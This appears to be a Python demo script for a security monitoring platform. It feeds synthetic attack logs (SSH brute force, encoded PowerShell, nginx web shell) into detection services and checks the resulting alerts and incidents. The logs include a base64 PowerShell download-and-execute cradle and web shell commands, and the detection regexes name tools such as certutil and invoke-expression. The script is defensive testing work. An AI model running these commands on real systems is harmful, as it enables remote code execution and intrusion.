#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
attack-scenarios.py —— 3 个完整攻击场景 Demo

从「攻击日志」到「检测 → 告警 → ATT&CK → 事件建案」的端到端演示：

  1. SSH 暴力破解   → AUTH-BRUTE (threshold)      → T1110  → HIGH
  2. Windows PowerShell 编码命令下载执行
                   → EXEC-SUSPICIOUS-SHELL (pattern) → T1059.001 → HIGH
  3. Linux nginx Web Shell（/bin/sh 由 nginx 拉起）
                   → WEB-SHELL（演示热更新新增规则） → T1505.003 → CRITICAL

用法： python3 build/demos/attack-scenarios.py
依赖：网关(18092) + detect-web(18082) + alert-web(18080) + incident-web(18097) 运行中
"""
import json
import os
import sys
import time
import urllib.request
import urllib.error
import uuid
from datetime import datetime, timezone

# Shared demo helpers live in ``build/`` while this scenario is under
# ``build/demos/``.  Resolve the parent explicitly so the script works both
# from the repository root and when invoked by CI.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from auth_client import login_token  # noqa: E402

GW = os.environ.get("DEMO_GATEWAY", "http://127.0.0.1:18092")
USER = os.environ.get("DEMO_USER", "demo")
PASSWD = os.environ.get("DEMO_PASS", "demo123")

SCENES = [
    {
        "no": 1,
        "name": "SSH 暴力破解（Brute Force）",
        "mitre": "T1110",
        "technique": "Brute Force",
        "severity": "HIGH",
        "desc": "同一源 IP 在 60s 窗口内出现 5 次 SSH 登录失败 → AUTH-BRUTE（threshold 规则）",
        "logs": [
            {"source": "auth", "host": "brute-demo-host", "severity": "HIGH",
             "msg": "Failed password for invalid user root from 203.0.113.77 port 51234 ssh2",
             "fields": {"src_ip": "203.0.113.77", "user": "root"}},
        ] * 5,
        "expect_rule": "AUTH-BRUTE",
        "check": lambda a: "203.0.113.77" in str(a.get("entity", "")),
    },
    {
        "no": 2,
        "name": "Windows 可疑 PowerShell（编码命令下载执行）",
        "mitre": "T1059.001",
        "technique": "PowerShell",
        "severity": "HIGH",
        "desc": "powershell -EncodedCommand 内联执行（常见于无文件攻击投递）→ EXEC-SUSPICIOUS-SHELL",
        "logs": [
            {"source": "edr", "host": "win-demo-01", "severity": "HIGH",
             "msg": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA= --s-enc",
             "fields": {"host": "win-demo-01", "user": "SYSTEM"}},
        ],
        "expect_rule": "EXEC-SUSPICIOUS-SHELL",
        "check": lambda a: "win-demo-01" in str(a.get("entity", ""))
                           or "powershell" in str(a.get("message", "")).lower(),
    },
    {
        "no": 3,
        "name": "Linux nginx Web Shell（命令执行）",
        "mitre": "T1505.003",
        "technique": "Web Shell",
        "severity": "CRITICAL",
        "desc": "nginx 进程拉起 /bin/sh（Web Shell 后门落地/利用）→ WEB-SHELL（演示热更新新增规则）",
        "logs": [
            {"source": "web", "host": "linux-web-01", "severity": "HIGH",
             "msg": "cmd=whoami;pwd;id&path=/uploads/shell.jspx",
             "fields": {"src_ip": "198.51.100.9", "process": "/usr/sbin/nginx", "user": "www-data"}},
            {"source": "web", "host": "linux-web-01", "severity": "HIGH",
             "msg": "nginx: worker process 1234 spawned /bin/sh -c whoami",
             "fields": {"src_ip": "198.51.100.9", "process": "/usr/sbin/nginx"}},
        ],
        "expect_rule": "WEB-SHELL",
        "check": lambda a: "198.51.100.9" in str(a.get("entity", ""))
                           or "linux-web-01" in str(a.get("entity", ""))
                           or "Web Shell" in str(a.get("message", "")),
    },
]

PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(("  [PASS] " if cond else "  [FAIL] ") + name + (("  -> " + str(detail)[:150]) if detail else ""))


def wait_for(fn, timeout=30.0, interval=1.0):
    end = time.time() + timeout
    last = None
    while time.time() < end:
        last = fn()
        if last:
            return last
        time.sleep(interval)
    return last


def login():
    return login_token(GW, USER, PASSWD)


def api(tok, path, body=None, method=None, *, headers=None, include_headers=False):
    """业务 API 直连服务端口（绕过网关，减少本机高负载下的转发时延）；登录走网关。"""
    port = 18080
    if path.startswith("/detect-web"):
        port = 18082
    elif path.startswith("/incident-web"):
        port = 18097
    base = "http://127.0.0.1:%d" % port
    method = method or ("POST" if body is not None else "GET")
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(base + path, data=data, method=method)
    req.add_header("Authorization", "Bearer " + tok)
    req.add_header("Content-Type", "application/json")
    for name, value in (headers or {}).items():
        req.add_header(name, value)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            result = r.status, json.loads(r.read().decode()), dict(r.headers)
    except urllib.error.HTTPError as e:
        with e:
            try:
                body = json.loads(e.read().decode())
            except (ValueError, UnicodeError):
                body = {}
            result = e.code, body, dict(e.headers)
    return result if include_headers else result[:2]


def ingest_event(tok, log, timeout=30):
    """Honor explicit non-admission during reload; never retry ambiguous failures."""
    event = dict(log)
    event.setdefault("eventId", str(uuid.uuid4()))
    event.setdefault("timestamp", datetime.now(timezone.utc).isoformat())
    deadline = time.monotonic() + timeout
    while True:
        status, body, headers = api(
            tok, "/detect-web/api/v1/ingest", event, "POST",
            headers={"Idempotency-Key": event["eventId"]}, include_headers=True)
        data = body.get("data") if isinstance(body, dict) else None
        rejected = (status == 503 and isinstance(data, dict)
                    and data.get("accepted") is False and data.get("error") == "queue_full")
        if not rejected:
            return status, body
        retry_after = next((value for key, value in headers.items()
                            if key.lower() == "retry-after"), "2")
        try:
            delay = max(0.1, float(retry_after))
        except (TypeError, ValueError):
            delay = 2.0
        if time.monotonic() + delay >= deadline:
            return status, body
        print("  [RETRY] 检测暂未接收事件，%.1fs 后以同一事件 ID 重试" % delay)
        time.sleep(delay)


def unwrap(value):
    """统一响应信封 {code,message,data}：code==0 返回 data，非 0 报错。"""
    if isinstance(value, dict) and "code" in value and "data" in value:
        if value.get("code") != 0:
            raise RuntimeError("API code=%s message=%s"
                               % (value.get("code"), value.get("message")))
        return value["data"]
    return value


def list_items(value):
    """data 兼容裸数组与统一分页对象 {items,total,...} 两种形状，返回列表。"""
    if isinstance(value, dict) and isinstance(value.get("items"), list):
        return value["items"]
    return value if isinstance(value, list) else []


def list_rules(tok):
    st, r = api(tok, "/detect-web/api/v1/rules")
    return list_items(unwrap(r)) if st == 200 else []


def revision_headers(rule):
    token = rule.get("revisionToken") if isinstance(rule, dict) else None
    if not isinstance(token, str) or len(token) != 64 or any(c not in "0123456789abcdef" for c in token):
        raise RuntimeError("Detection API did not return a current revisionToken; update the server and reload before writing")
    return {"If-Match": '"' + token + '"'}


def activate_demo_rule(tok, rule):
    """The explicitly run demo promotes its reviewed fixture through /activate."""
    if str(rule.get("status", "")).upper() == "ACTIVE":
        return True, "已存在且已启用"
    st, result = api(tok, "/detect-web/api/v1/rules/" + rule["id"] + "/activate", {}, "POST",
                     headers=revision_headers(rule))
    return st == 200, result


def ensure_web_shell_rule(tok, publisher=None):
    """场景 3：按 ID 读取规则，仅在不存在时创建，再显式启用演示规则。"""
    st, result = api(tok, "/detect-web/api/v1/rules/WEB-SHELL")
    if st == 200:
        return activate_demo_rule(publisher or tok, unwrap(result))
    if st != 404:
        return False, "读取 WEB-SHELL 失败: HTTP %s" % st
    body = {
        "id": "WEB-SHELL", "name": "Web Shell 命令执行", "type": "pattern", "severity": "CRITICAL",
        "message": "疑似 Web Shell 命令执行：{msg} @ {host}", "mitre": "T1505.003",
        "match": [
            {"field": "msg", "op": "regex",
             "value": r"(?i)shell\.jsp|/bin/sh\s+-c|cmd=whoami|eval\s*\(|base64_decode|assert\s*\("},
        ],
    }
    st, result = api(tok, "/detect-web/api/v1/rules", body, "POST")
    return activate_demo_rule(publisher or tok, unwrap(result)) if st == 200 else (False, result)


def ensure_exec_rule(tok, publisher=None):
    """场景 2：按已读取版本修正命令匹配规则，再显式启用演示规则。"""
    st, result = api(tok, "/detect-web/api/v1/rules/EXEC-SUSPICIOUS-SHELL")
    if st != 200:
        return False, "读取 EXEC-SUSPICIOUS-SHELL 失败: HTTP %s" % st
    current = unwrap(result)
    if "powershell.*" not in json.dumps(current.get("match", []), ensure_ascii=False):
        updated = dict(current)
        updated.pop("status", None)
        updated["match"] = [
            {"field": "msg", "op": "regex",
             "value": r"(?i)powershell.*(-enc|encodedcommand)|certutil -urlcache|invoke-expression|iex\s*\("},
        ]
        st, result = api(tok, "/detect-web/api/v1/rules/EXEC-SUSPICIOUS-SHELL", updated, "PUT",
                        headers=revision_headers(current))
        if st != 200:
            return False, result
        current = unwrap(result)
    return activate_demo_rule(publisher or tok, current)


def main():
    tok = login()
    publisher = login_token(GW, os.environ.get("RULE_VERIFY_USERNAME", "admin"),
                            os.environ.get("RULE_VERIFY_PASSWORD", "admin123"))
    print("=== SOCP 攻击场景 Demo（日志 → 检测 → 告警 → ATT&CK → 事件） ===\n")

    for sc in SCENES:
        print("=" * 72)
        print("场景 %d: %s" % (sc["no"], sc["name"]))
        print("  技术: %s  |  ATT&CK: https://attack.mitre.org/techniques/%s/"
              % (sc["technique"], sc["mitre"].replace("-", "/")))
        print("  说明: %s" % sc["desc"])
        print("-" * 72)

        # 1) 规则就绪（场景 2/3 演示热更新修正/新增）
        ok = True
        if sc.get("expect_rule") == "WEB-SHELL":
            ok, detail = ensure_web_shell_rule(tok, publisher)
            check("规则 WEB-SHELL 就绪（API 新建/热更新）", ok, detail if isinstance(detail, str) else "")
        if sc.get("expect_rule") == "EXEC-SUSPICIOUS-SHELL":
            ok, detail = ensure_exec_rule(tok, publisher)
            check("规则 EXEC-SUSPICIOUS-SHELL 已修正（热更新）", ok, detail if isinstance(detail, str) else "")
        if not ok:
            continue

        baseline_status, baseline = api(tok, "/alert-web/api/alarms?page=1&size=500")
        check("读取本次注入前的告警基线", baseline_status == 200)
        if baseline_status != 200:
            continue
        previous_ids = {item.get("id") for item in list_items(unwrap(baseline))}

        # 2) 注入攻击日志
        accepted = 0
        for i, log in enumerate(sc["logs"]):
            st, r = ingest_event(tok, log)
            if st == 200 and unwrap(r).get("accepted") is True:
                accepted += 1
            else:
                print("  [WARN] 事件 %d 注入 st=%s response=%s" % (i, st, r))
        check("本次攻击日志全部接收", accepted == len(sc["logs"]), f"accepted={accepted}")

        # 3) 等待告警
        def alarm_hit():
            try:
                st, a = api(tok, "/alert-web/api/alarms?page=1&size=500")
                items = list_items(unwrap(a)) if st == 200 else []
            except RuntimeError:
                return None
            for x in items:
                if (x.get("id") not in previous_ids
                        and x.get("ruleId") == sc["expect_rule"] and sc["check"](x)):
                    return x
            return None

        alarm = wait_for(alarm_hit, timeout=40)
        check("检测命中并产生告警（%s）" % sc["expect_rule"], alarm is not None,
              alarm.get("severity") if alarm else "")
        if alarm:
            print("  告警: [%s] %s" % (alarm.get("severity"), alarm.get("message", "")[:90]))
            print("  规则: %s | 实体: %s | MITRE: %s"
                  % (alarm.get("ruleId"), alarm.get("entity"), alarm.get("mitre")))

        # 4) Alert persistence precedes asynchronous incident fan-out. Poll for
        # this exact new alarm; a manual case cannot prove automatic delivery.
        def related_incidents():
            st, cases = api(tok, "/incident-web/api/v1/incidents?size=100")
            cl = list_items(unwrap(cases)) if st == 200 else []
            return [case for case in cl
                    if alarm and alarm.get("id") in (case.get("alarmIds") or [])]

        related = (wait_for(related_incidents, timeout=40) or []) if alarm else []
        check("告警关联事件（自动建案/归并）", len(related) >= 1,
              related[0].get("title", "")[:60] if related else "")
        print()

    print("=" * 72)
    print("攻击场景 Demo 通过 %d / 失败 %d" % (len(PASS), len(FAIL)))
    for f in FAIL:
        print("  FAILED:", f)
    sys.exit(1 if FAIL else 0)


if __name__ == "__main__":
    main()
